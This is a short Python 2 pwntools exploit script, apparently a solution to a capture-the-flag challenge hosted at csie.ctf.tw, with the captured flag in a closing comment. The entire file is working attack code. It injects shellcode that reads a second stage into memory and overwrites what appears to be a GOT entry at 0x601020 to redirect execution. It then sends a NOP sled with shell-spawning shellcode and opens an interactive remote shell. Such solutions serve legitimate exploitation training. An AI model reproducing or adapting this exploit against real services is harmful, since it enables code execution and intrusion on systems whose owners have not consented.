#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'

r = remote('csie.ctf.tw', 10129)
#r = remote('127.0.0.1', 7122)

r.recvuntil('name :')
#x = '\x00'*2+asm(shellcraft.sh())
x = '4\x00'+asm(shellcraft.read(0, 0x6010a0, 512))
print len(x), repr(x)
r.sendline(x)
r.recvuntil('write :')
r.sendline('601020')
r.recvuntil('data :')
r.send(p64(0x6010a0))
sleep(0.2)
r.send('\x90'*60+asm(shellcraft.sh()))

r.interactive()

# FLAG{G0THiJJack1NG}
